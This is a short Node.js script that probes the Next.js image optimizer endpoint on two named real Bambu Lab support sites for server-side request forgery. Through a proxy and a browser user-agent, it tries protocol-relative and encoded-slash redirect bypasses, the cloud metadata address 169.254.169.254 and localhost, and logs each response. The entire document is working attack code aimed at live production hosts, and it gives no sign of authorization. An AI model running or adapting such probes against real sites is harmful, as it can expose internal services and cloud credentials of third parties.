const {ProxyAgent, fetch}=require('undici');
const d=new ProxyAgent(process.env.HTTPS_PROXY||'http://127.0.0.1:7890');
const UA='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36';
const urls=[
 '/favicon.ico',
 '//example.com/',
 '///example.com/',
 '/%2Fexample.com/',
 '/\\example.com/',
 '/%5C%5Cexample.com/',
 'http://169.254.169.254/latest/meta-data/',
 '//169.254.169.254/latest/meta-data/',
 'http://127.0.0.1:80/',
 '//127.0.0.1:80/',
 'https://csm-fe.bblcdn.com/im/prod/_next/static/chunks/webpack-e7ca971296b039d9.js',
 'https://csm.bblcdn.com/',
 'https://support.bambulab.cn/favicon.ico',
 '/liveChat',
];
(async()=>{
 for(const B of ['https://support.bambulab.cn','https://support.bambulab.com']){
  console.log('###',B);
  for(const u of urls){
   const q=B+'/_next/image?url='+encodeURIComponent(u)+'&w=64&q=75';
   try{const r=await fetch(q,{headers:{'user-agent':UA,accept:'image/*'},dispatcher:d,signal:AbortSignal.timeout(12000)});const ct=r.headers.get('content-type');const b=Buffer.from(await r.arrayBuffer());console.log(r.status,JSON.stringify(u),'ct=',ct,'len=',b.length,'|',b.slice(0,60).toString('utf8').replace(/\s+/g,' '));}catch(e){console.log('ERR',JSON.stringify(u),e.name,e.message)}
  }
 }
})();
